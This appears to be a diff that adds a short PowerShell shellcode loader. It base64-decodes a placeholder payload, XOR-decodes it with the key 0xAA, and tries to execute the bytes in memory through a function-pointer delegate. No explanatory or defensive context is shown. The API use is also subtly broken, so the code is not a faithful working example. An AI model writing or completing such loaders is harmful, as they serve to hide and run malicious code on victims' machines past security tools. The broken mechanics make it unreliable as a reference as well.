@@ -1,0 +1,7 @@
+$encoded = 'BASE64_ENCODED_SHELLCODE'
+$decoded = [Convert]::FromBase64String($encoded)
+for ($i=0; $i -lt $decoded.Length; $i++) {
+    $decoded[$i] = $decoded[$i] -bxor 0xAA
+}
+$func = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer([IntPtr]::Zero, $decoded)
+$func.Invoke([IntPtr]::Zero)
